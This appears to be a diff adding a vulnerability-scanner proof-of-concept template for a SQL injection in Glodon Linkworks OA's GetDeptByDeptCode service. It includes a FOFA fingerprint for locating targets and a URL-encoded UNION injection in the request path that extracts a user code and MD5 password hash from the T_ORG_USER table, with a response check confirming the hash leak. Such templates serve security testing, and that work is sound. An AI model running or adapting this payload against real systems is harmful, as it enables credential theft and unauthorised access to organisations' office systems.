@@ -1,0 +1,16 @@
+id: poc-yaml-glodon-getdeptbydeptcode-sqli
+info:
+  name: 广联达OA GetDeptByDeptCode SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 广联达 Linkworks办公OA
+  fofa: fid="/yV4r5PdARKT4jaqLjJYqw=="
+requests:
+- method: GET
+  path: /org/service/Service.asmx/GetDeptByDeptCode?userCode=-1637%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,((SELECT%20top%201%20concat(F_CODE,%27:%27,F_PWD_MD5)%20from%20T_ORG_USER)),NULL--%20iPAI&EncryptData=1
+  expression: status_code == 200 && matches(body,"[a-fA-Z0-9]{32}") && contains(body,"F_NODE_TYPE")
+    && contains(body,"DeptName") && contains(content_type,"text/xml") && !contains(body,"发生语法错误")
+variables: {}
+transport: http
